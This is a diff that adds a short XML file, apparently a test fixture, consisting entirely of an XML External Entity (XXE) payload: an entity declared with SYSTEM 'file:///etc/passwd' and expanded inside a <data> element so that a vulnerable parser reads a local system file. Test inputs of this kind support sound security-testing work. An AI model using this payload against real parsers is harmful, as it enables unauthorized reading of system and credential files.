@@ -1,0 +1,7 @@
+<?xml version="1.0"?>
+<!DOCTYPE test [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<test>
+  <data>&xxe;</data>
+</test>
